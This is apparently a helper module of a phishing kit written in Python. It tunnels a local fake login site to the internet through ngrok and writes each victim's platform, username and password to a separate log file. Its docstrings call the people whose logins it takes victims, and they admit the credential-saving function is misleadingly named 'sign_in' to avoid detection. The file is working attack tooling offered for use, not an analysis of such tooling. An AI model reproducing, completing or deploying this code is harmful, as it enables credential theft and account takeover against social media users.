import os
import time
import socket
import requests
import traceback
from pyngrok import ngrok
from typing import Any, Callable
from .constants import (
    PUBLIC_TUNELS,
    PVT_TUNNELS,
    LOAD_STEP,
    PUBLICURL,
    ERRORTXT,
    LOGSTXT,
    BANNER,
    TODAY,
    URL,
    info,
    warning,
    success,
    theme_color
)


def banner() -> str:
    with open(BANNER, mode='r') as f:
        return theme_color(f.read())


def get_IPv4() -> str:
    """Simply finds and returns the ipv4 of the user
    for local hosting purposes

    :return str:
    """    
    
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        # doesn't even have to be reachable
        s.connect(('10.254.254.254', 1))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip


def kill_previous_connection():
    """A miserable attempt to kill previously
    established ngrok tunnel because the program
    sometimes decides not to thus, creating
    an issue the next time it's to be used
    """    
    with open(URL, mode='r') as f:
        content = f.read()
    if content:
        url_start = content.index('"') + 1
        url_stop = content.index('"', url_start+1)
        ngrok.disconnect(content[url_start:url_stop])


def create_initial_files(): # Current: error_log.txt | url.txt
    neccesary_files = [
        'error_log.txt',
        'url.txt',
    ]
    main_dir = os.listdir('..')
    for file in neccesary_files:
        if file not in main_dir:
            with open(os.path.join('..', file), mode='w') as f:
                f.write('')
                

def log_error(func: Callable) -> Any:
    def inner(*args, **kwargs):
        """This function is only meant to be used as a decorator.
        handles exceptions and logs errors accordingly
        in the error_logger.txt
        """    
        try:
            return func(*args, **kwargs)
        except KeyboardInterrupt:
            ngrok.disconnect(PUBLICURL)
            os._exit()
        except Exception as e:
            os.system('clear')
            print(warning(str(e)))
            with open(ERRORTXT, mode='a+') as f:
                print(str(e))
                f.write(f"{TODAY}\n")
                f.write(f'Short: {e}\n\n')
                f.write(f"{traceback.format_exc()}\n\n")
                f.write('-----------------\n\n')
            ngrok.disconnect(PUBLICURL)
            os._exit(1)
    
    return inner


def make_new_file_name(usernm: str) -> str:
    """Formats a new register along with the
    path to the `logs` directory. It is later
    used in order to create a new file for each
    new victim.

    :param str usernm: Username of the victim
    :return str: path/to/logs/`username.txt`
    """    
    return os.path.join(LOGSTXT, f"{usernm}.txt")


@log_error
def sign_in(usernm: str, passwd: str, social: str) -> None:
    """This functions is mis-leadingly called `sign_in` to
    avoid detection and sus

    :param str usernm: Victim's username
    :param str passwd: Victim's password
    :param str social: The social media platform that the credentials belong to
    """    
    with open(make_new_file_name(usernm), mode='w') as f:
        f.write('~ NEW ACCOUNT ~\n\n\n')
        f.write(f'Platform: {social}\n')
        f.write(f'Username {usernm}\n')
        f.write(f'Password: {passwd}\n')
    print(success("An account has been saved succesfuly"))


@log_error
def log_new_url(url) -> None:
    """Present the user with the public ngrok url and
    log it in the accorging folder

    :param _type_ url: _description_
    """    
    with open(URL, mode='w') as f:
        f.write('~~ URL ~~~\n')
        f.write('This url will change after this session:')
        f.write(f'\t{url}')
    print(f'Url: {url}')
    print(f'This is also logged in `{URL}`.')


# TODO: Make a url shortener function
"""
def shortener(url):
    ...
"""


@log_error
def connect_ngrok(port):
    """Port forwarding to ngrok servers
    """
    global PUBLICURL
    PUBLICURL = ngrok.connect(port)
    log_new_url(PUBLICURL)
    # TODO: Call the shortener here


@log_error
def request_localhost(host: str, port: str) -> None:
    """The localhost needs at least one request
    to refresh in order to start the connection with
    ngrok. This function solves the problem
    by faking 1 `GET` request automatically
    without the user having to interact with anything

    :param str host: Local host's address
    :param str port: The port flask uses for the localhost
    """    
    addr = f'http://{host}:{port}/'
    requests.get(addr)
    print(success("~ YOUR SITE IS ON-LINE ~"))


@log_error
def status_bar(load_time: int) -> None:
    """Just a visual effect untill the face
    `GET` request from `requst_localhost` function finishes

    :param int load_time: The custom time that has been approximated to make
    sure that the server is up and running before sending the request
    """    
    percentage = 0.0
    block = ''
    for _ in range(int(load_time)):
        percentage += LOAD_STEP
        block += '▋ '
        print(info(f'% {percentage}) {block}'))
        time.sleep(1)
        os.system('clear')


def push_page_options(port) -> str:
    push_page_question = input(f"""Choose one of the following services:
%s: """ %(' - '.join(PUBLIC_TUNELS + PVT_TUNNELS))).lower()

    host = '127.0.0.1'
    if push_page_question == 'private':
        host = '127.0.0.1'
    elif push_page_question == 'local':
        host = get_IPv4()
    elif push_page_question == 'ngrok':
        host = '127.0.0.1'
    elif push_page_question == 'localtunnel':
        host = '127.0.0.1'
    os.system('clear')
    if push_page_question in PUBLIC_TUNELS + PVT_TUNNELS:
        return push_page_question, host

    return PVT_TUNNELS[0], host
